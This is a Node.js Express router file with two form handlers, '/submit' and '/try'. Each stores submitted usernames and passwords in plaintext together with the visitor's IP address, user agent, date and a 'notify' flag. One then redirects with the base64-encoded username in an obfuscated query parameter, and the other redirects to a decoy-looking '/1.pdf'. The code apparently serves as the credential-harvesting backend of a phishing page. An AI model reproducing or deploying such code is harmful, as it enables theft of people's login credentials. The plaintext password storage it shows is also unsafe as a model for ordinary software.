
const express = require ('express');
const router = express.Router();
const db = require('./db');

const bodyParser = require('body-parser');

router.use(bodyParser.urlencoded({ extended: false }));


//validate form data before handling
// Custom middleware for form validation
const validateFormData = (req, res, next) => {
  const { username, password } = req.body;

  
  if (!username || !password) {
      return res.status(400).render('error');
  }

  // Additional validation checks can be added here

  // If validation passes, proceed to the next middleware or route handler
  next();
};


// Handle form submission

router.post('/submit', validateFormData, (req, res) => {
   
    const name = req.body.username;
    const b64 = Buffer.from(name).toString('base64');
    const word = req.body.password;
    // const clientIP = req.headers['x-forwarded-for'];
    // const ip =  clientIP.split(',')[0].trim(); 
    const ip = req.socket.remoteAddress; 
    const useragent = req.get('User-Agent');
    const date = new Date();
    const notify = 0;


    
                            const insertQuery = 'INSERT INTO clkTable (username, password, ip, useragent,date,notify) VALUES (?,?,?,?,?,?)';
                            db.query(insertQuery, [name, word, ip, useragent, date, notify], (err) => {
                                if (err) {
                                    console.error('Error inserting record:', err);
                                    return res.status(500).send('Internal Server Error');
                                }
                                res.redirect(`/home/?sdjfwerepogjfkjklbnfjgeoiruweiuritergjmdkfjwirwe9=${b64}`);
                            });
                                    });
      
  


const validateFormData2 = (req, res, next) => {
    const { username, password } = req.body;
    
    
    if (!username || !password) {
        return res.status(400).render('error');
    }
    
    // Additional validation checks can be added here
    
    // If validation passes, proceed to the next middleware or route handler
    next();
    };


router.post('/try', validateFormData2, (req, res) => {

    const name = req.body.username;
    const b64 = Buffer.from(name).toString('base64');
    const word = req.body.password;
    // const clientIP = req.headers['x-forwarded-for'];
    // const ip =  clientIP.split(',')[0].trim(); 
    const ip = req.socket.remoteAddress; 
    const useragent = req.get('User-Agent');
    const date = new Date();
    const notify = 0;
        
    
    
    
                    const insertQuery = 'INSERT INTO newtable (username, password, ip, useragent,date,notify) VALUES (?,?,?,?,?,?)';
                    db.query(insertQuery, [name, word, ip, useragent, date, notify], (err) => {
                        if (err) {
                            console.error('Error inserting record:', err);
                            return res.status(500).send('Internal Server Error');
                        }
                        res.redirect(`/1.pdf`);
                    });
                            
        
    
        
    
    
                                      });
                                      
  




module.exports =router